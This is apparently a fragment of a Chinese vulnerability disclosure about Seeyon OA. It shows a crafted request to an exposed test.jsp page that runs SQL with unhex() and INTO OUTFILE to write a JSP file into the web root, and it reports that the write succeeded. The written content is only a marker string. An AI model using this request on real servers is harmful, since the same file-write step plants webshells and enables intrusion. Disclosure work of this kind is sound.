basedir1	D:\seeyon\mysql\bin\..\那么程序文件路径有可能就是D:/seeyon/tomcat/webapps/yyoa/构造Hex上传试试:**.**.**.**/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%27576f6f79756e2d4865726f6c6f6e%27)%20%20into%20outfile%20%27D:/seeyon/tomcat/webapps/yyoa/t.jsp%27mysql导出文件成功得到**.**.**.**/yyoa/t.jsp
